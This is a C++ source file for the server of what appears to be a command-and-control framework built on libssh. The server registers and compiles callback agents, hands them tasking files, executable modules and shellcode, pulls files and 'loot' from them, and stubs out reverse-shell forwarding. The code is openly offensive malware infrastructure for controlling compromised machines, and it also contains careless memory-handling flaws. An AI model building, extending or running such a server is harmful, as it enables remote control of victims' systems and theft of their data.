#include "server.h"

#ifdef HAVE_ARGP_H
#include <argp.h>
#endif


// TODO: RETHINK THIS WHOLE THING
#ifdef HAVE_ARGP_H
const char *argp_program_version = "libssh server example "
    SSH_STRINGIFY(LIBSSH_VERSION);
const char *argp_program_bug_address = "<libssh@libssh.org>";

/* Program documentation. */
static char doc[] = "libssh -- a Secure Shell protocol implementation";

/* A description of the arguments we accept. */
static char args_doc[] = "BINDADDR";

/* The options we understand. */
static struct argp_option options[] = {
    {
        .name  = "port",
        .key   = 'p',
        .arg   = "PORT",
        .flags = 0,
        .doc   = "Set the port to bind.",
        .group = 0
    },
    {
        .name  = "hostkey",
        .key   = 'k',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the host key.",
        .group = 0
    },
    {
        .name  = "dsakey",
        .key   = 'd',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the dsa key.",
        .group = 0
    },
    {
        .name  = "rsakey",
        .key   = 'r',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the rsa key.",
        .group = 0
    },
    {
        .name  = "verbose",
        .key   = 'v',
        .arg   = NULL,
        .flags = 0,
        .doc   = "Get verbose output.",
        .group = 0
    },
    {
        .name = "agent",
        .key = 'a',
        .arg = "IP:PORT",
        .flags = 0,
        .doc = "Compile an agent which will connect to IP over PORT",
        .group = 0
    },
    {
        .name = "authenticate",
        .key = 'i',
        .arg = "ID:PASS",
        .flags = 0,
        .doc = "Add agent information to the server database",
        .group = 0
    },
    {NULL, 0, 0, 0, NULL, 0}
};

/* Parse a single option. */
static error_t parse_opt (int key, char *arg, struct argp_state *state) {
  /* Get the input argument from argp_parse, which we
   * know is a pointer to our arguments structure.
   */
    ssh_bind sshbind = (ssh_bind) state->input;
    char *ip;
    char *port;
    char *pass;
    char *id;
    int dbg = 0;
    int halt = 0;
    char buff[256];
    AgentInformationHandler *handler = new AgentInformationHandler();
  
    switch (key) {
        case 'p':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDPORT_STR, arg);
            break;
        case 'd':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY, arg);
            break;
        case 'k':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_HOSTKEY, arg);
            break;
        case 'r':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY, arg);
            break;
        case 'v':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_LOG_VERBOSITY_STR, "3");
            break;
        case 'a':
            halt = 1;
            port = strchr(arg, ':') + 1;
            if(port == NULL){
                printf("Improper format: needs to be IP:PORT\n");
                argp_usage(state);
            }
            dbg = misc_index_of(arg, ':', 0);
            ip = misc_substring(arg, dbg, strlen(arg));
        
            handler->compile(ip, port);
            free(ip);
            break;
        case 'i':
            halt = 1;
            pass = strchr(arg, ':') + 1;
            if(pass == NULL){
                printf("Improper format: needs to be ID:PASSWORD\n");
                argp_usage(state);
            }
            dbg = misc_index_of(arg, ':', 0);
            id = misc_substring(arg, dbg, strlen(arg));

            AgentInformationHandler::register_agent(id, pass);
            sprintf(buff, "Registered agent with %s and %s\n", id, pass);
            free(id);
            break;
        case ARGP_KEY_ARG:
            if (state->arg_num >= 1) {
            /* Too many arguments. */
                argp_usage (state);
            }
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDADDR, arg);
            break;
        case ARGP_KEY_END:
            if (state->arg_num < 1) {
                /* Not enough arguments. */
                delete handler;
                if(!halt)
                    argp_usage (state);
                else exit(0);
            }
            break;
        default:
            return ARGP_ERR_UNKNOWN;
    }

    return 0;
}

/* Our argp parser. */
static struct argp argp = {options, parse_opt, args_doc, doc, NULL, NULL, NULL};
#endif /* HAVE_ARGP_H */

/*Global variables and data structures*/
pthread_t thread_array[MAX_CONN];

/*constructor for the connection instance*/
ConnectionInstance::ConnectionInstance(){
    int ret;
    char* last;
	char result[4096];
    char dir[4096];
    unsigned long index;
    struct stat st = {0};
    this->logger = new Log();
    this->list = new List();
    
    memset(result, 0, sizeof(result));
	memset(dir, 0, sizeof(dir));
	
    // seed random number generator
    srand(time(NULL));

	// gets current file path, so data will be written to correct folder regardless of where execution is called
	readlink( "/proc/self/exe", result, 4096);

	last = strrchr(result, '/');
	index = last - result;
	strncpy(dir, result, index);
	
	ret = chdir(dir);
	if(ret < 0){
		perror("Failed to change directory");
		exit(-1);
	}


    umask(0);

    // initialize base directories
    if (stat("agents", &st) == -1) {
        mkdir("agents", 0755);
        printf("Server: initialized directory 'agents'\n");
    }

    if (stat("out", &st) == -1) {
        mkdir("out", 0755);
        printf("Server: initialized directory 'out'\n");
    }

    if (stat(DATA_FILE, &st) == -1) {
        int fd2 = open(DATA_FILE, O_RDWR | O_CREAT, S_IRUSR | S_IRGRP | S_IROTH);
        printf("Server: initialized agent authentication file\n");
        close(fd2);
    }
}

/*Neato destructor*/
ConnectionInstance::~ConnectionInstance(){
    return;
}

/*Not implemented yet because why not?*/
void ConnectionInstance::get_info(char *ptr){
    return;
}

/*Handler for manager connections and flow*/
void ConnectionInstance::manager_handler(){
    pClientNode node = this->transport->get_node();
    
    int operation;
    int rc = 0;
    int quitting = 0;
    int count = 0;
    char *ptr = NULL;
    char *dat_ptr = NULL;
    char *d_ptr = NULL;
    char tmpbf[3] = {0,0,0};
    char tmpbuffer[8];
    char filename[2048];
    char resp[2048];
    char buff[BUFSIZ];
    char logbuff[BUFSIZ];
            
    // main instruction loop
    while (!quitting)
    {
        // reset variables for loop
        ptr = resp;
        operation = -1;
        rc = 0;
        dat_ptr = NULL;

        
        memset(buff, 0, sizeof(buff));
        memset(tmpbuffer, 0, sizeof(tmpbuffer));
        memset(filename, 0, sizeof(filename));
        memset(resp, 0, sizeof(resp));
        memset(logbuff, 0, sizeof(logbuff));
        
        // get operation request
        this->transport->read((char **)&resp);
        
        // parse it
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 3;

        sprintf(logbuff, "Manager %s: Operation caught: %d\n", node->data->id, operation);
        this->logger->log(logbuff);

        // TODO: FIX THIS?
        if(*ptr == '\0'){
            sprintf(logbuff, "Manager %s: Caught illegal operation option: NULL\n", node->data->id);
            this->logger->log(logbuff);
            this->transport->send_err();
            quitting = 1;
            continue;
        }

        // main switch
        switch (operation)
        {
        case MANAG_EXIT:
            this->list->remove_node(node);
            quitting = 1;
            break;

        case MANAG_GET_LOOT:
            transport->get_loot(ptr);
            break;

        case MANAG_UP_FILE:
            // Agent_id is stored in ptr
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                this->logger->log(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            transport->download_file(d_ptr, 1, dat_ptr);
            AgentInformationHandler::task(AGENT_DOWN_FILE, dat_ptr, d_ptr);
            break;

        case MANAG_REQ_RVSH:
            printf("Manager shell command caught\n");
            break;

        case MANAG_TASK_MODULE:
            // Agent_id is stored in ptr 
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                this->logger->log(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            transport->download_file(d_ptr, 1, dat_ptr);
            
            AgentInformationHandler::task(AGENT_EXEC_MODULE, dat_ptr, d_ptr);
            break;

        case MANAG_CHECK_LOOT:
            printf("Caught loot check call\n");
            break;

        case MANAG_DOWN_FILE:
            // requested agent and filename are stored in ptr
            // by the end, filename is in d_ptr and agent is in dat_ptr
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                this->logger->log(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            AgentInformationHandler::task(AGENT_UP_FILE, dat_ptr, d_ptr);
            this->transport->send_ok();
            break;

        case MANAG_TASK_SC:
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                this->logger->log(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            AgentInformationHandler::task(AGENT_EXEC_SC, dat_ptr, d_ptr);
            this->transport->send_ok();
            break;

        case MANAG_GET_AGENT:
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                this->logger->log(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));

            transport->make_agent(dat_ptr, d_ptr);
            dat_ptr = NULL;
            transport->upload_file("out/client.out", 0);
            break;

        case MANAG_REG_AGENT:
            printf("Caught agent register call\n");
            break;

        case MANAG_GET_INFO:
            this->get_info(ptr);
            break;

        case MANAG_REQ_PORTS:
            this->get_ports(ptr);
            break;

        default:
            sprintf(logbuff, "Manager %s: Unknown operation value '%d'\n", node->data->id, operation); 
            this->logger->log(logbuff);
            this->transport->send_err();
            break;
        }
    }
    
}

/*Returns all available ports for accessing reverse shells*/
void ConnectionInstance::get_ports(char *ptr){

}

/*Place holder*/
void ConnectionInstance::reverse_shell(){}
/*Handles reverse shell connections and forwarding*/

/*Handler for agent connections and flow*/
void ConnectionInstance::agent_handler(){    
    // initialize variables
    int operation = 0;
    int rc = 0;
    int quitting = 0;
    char *ptr = NULL;
    char tmpbf[3] = {0,0,0};
    char tmpbuffer[8];
    char buff[2048];
    char filename[2048];
    char resp[2048];
    char logbuff[BUFSIZ];
    pClientNode node = transport->get_node();
            
    // enters main handler loop
    while (!quitting)
    {
        // reset buffers and variables on repeat
        ptr = resp;
        operation = -1;
        rc = 0;
        memset((void*)buff, 0, 2048);
        memset((void*)tmpbuffer, 0, 8);
        memset((void*)filename, 0, 2048);
        memset((void*)resp, 0, sizeof(resp));
        memset((void*)logbuff, 0, sizeof(logbuff));

        // gets the agent's requested tasking operation
        this->transport->read((char**)&resp);
        
        // parses operation into buffers
        //printf("Requested tasking: %s\n", resp);
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 3;
        
        /*
        Command data structure:
            First char: 
                Describes what command it is
            Following chars:
                Optional values, separated by ',' chars
            Terminating sequence:   
                NULL
        */

        sprintf(logbuff, "Client %s: Operation caught: %d\n", node->data->id, operation);
        this->logger->log(logbuff);

        // checks if illegal options 
        // TODO: FIX THIS???
        if(*ptr == '\0'){
            sprintf(logbuff, "Client %s: Caught illegal operation option: NULL\n", node->data->id);
            this->logger->log(logbuff);
            this->transport->send_err();
            quitting = 1;
            continue;
        }

        // main decision switch
        switch (operation)
        {
        case AGENT_EXIT:
            printf("Client %s: Client exiting...\n", node->data->id); 
            this->list->remove_node(node);
            quitting = 1;
            break;

        case AGENT_DOWN_FILE:
            sprintf(buff, "agents/%s/tasking/%s", node->data->id, ptr);
            transport->upload_file(buff, 0);
            break;

        case AGENT_UP_FILE:
            transport->download_file(ptr, 0, NULL);
            break;

        case AGENT_REV_SHELL:
            printf("Agent reverse shell caught\n");
            this->reverse_shell();
            break;

        case AGENT_EXEC_MODULE:
            sprintf(buff, "agents/%s/tasking/%s", node->data->id, ptr);
            transport->upload_file(buff, 1);
            break;

        default:
            sprintf(logbuff, "Client %s: Unknown operation value '%d'\n", node->data->id, operation); 
            this->logger->log(logbuff);
            this->transport->send_err();
            break;
        }
    }
}


/*Initialized the connection and prepares data structures for handlers*/
void *ConnectionInstance::handle_connection(void *input){
    class ConnectionInstance *instance = (class ConnectionInstance *)input;

    // creates classes and instances
    int handler = instance->transport->determine_handler();
    

    // determines handler to use
    if (handler == AGENT_TYPE)
    {
        printf("Starting agent handler\n");
        instance->agent_handler();
    } else if(handler == MANAG_TYPE)
    {
        printf("Starting manager handler\n");
        instance->manager_handler();
    } else
    {
        // failed to handle the parsing :)
        printf("Woops got an unknown type: %d\n", handler);
    }
}

/*Sets the transport for the connection instance*/
void ConnectionInstance::set_transport(class ServerTransport *transport){
    this->transport = transport;
}

/*returns the logger used by the instance*/
class Log *ConnectionInstance::get_logger(){
    return this->logger;
}

/*returns the list used by the instance*/
class List *ConnectionInstance::get_list(){
    return this->list;
}

/*handy little print function for debugging pClientDat structures*/
void print_clientDat(pClientDat str){
    printf("\n\nID: %s\n", str->id);
    printf("Type: %d\n\n\n", str->type);
}


/*Funny enough, this is the main function*/
int main(int argc, char **argv){
    // TODO: UPDATE SIGHANDLERS TO MODERN STUFF

    // set up signal handlers
    //struct sigaction sigIntHandler;
	//struct sigaction sigTermHandler;


	//sigIntHandler.sa_handler = handleTerm;
   	//sigemptyset(&sigIntHandler.sa_mask);
   	//sigIntHandler.sa_flags = 0;

	//sigTermHandler.sa_handler = handleTerm;
	//sigemptyset(&sigTermHandler.sa_mask);
	//sigTermHandler.sa_flags = 0;

   	//sigaction(SIGINT, &sigIntHandler, NULL);
    //sigaction(SIGTERM, &sigTermHandler, NULL);
    
    // initialize variables
    int quitting = 0;
    class ConnectionInstance *instance = new ConnectionInstance();
    class Log *logger = instance->get_logger();
    class List *list = instance->get_list();
    class ServerTransport *server;
    int type = 0;
    int rc = 0;
    int ctr = 0;
    int opt = 1;
    int master_socket;
    pthread_t thread;
    
    if( (master_socket = socket(AF_INET , SOCK_STREAM , 0)) == 0){   
        perror("Server: Socket Failure");   
        return 1;   
    }

    if(setsockopt(master_socket, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt)) < 0 ){   
        perror("Server: Setsockopt Failure");   
        return 1;   
    }


    switch (type)
    {
    case 0:
        server = new Ssh_Transport(logger, list, nullptr);
        break;
    
    default:
        break;
    }
    instance->set_transport(server);
/*   
#ifdef HAVE_ARGP_H
    /*
     * Parse our arguments; every option seen by parse_opt will
     * be reflected in arguments.
     *
    argp_parse (&argp, argc, argv, 0, 0, sshbind);
#else
    (void) argc;
    (void) argv;
#endif*/

    
    // accept connections
    // TODO: FIX THIS SO LOOP BIND WORKS LOL
    //while (!quitting){
        rc = server->listen(master_socket);

        // pass connection to handler thread
        if(pthread_create(&thread, NULL, instance->handle_connection, instance)){
            printf("Error creating thread\n");
            delete instance;
            return 1;
        }
        thread_array[ctr] = thread;
    //}

    while(1){
        sleep(1);
    }
        
        
    for (size_t i = 0; i < ctr; i++){
        if(pthread_join(thread_array[i], NULL)){
            printf("Failed to join thread at index %lu\n", i);
        }
    }

    
    printf("Server: Terminated successfully\n");
    return 0;
}
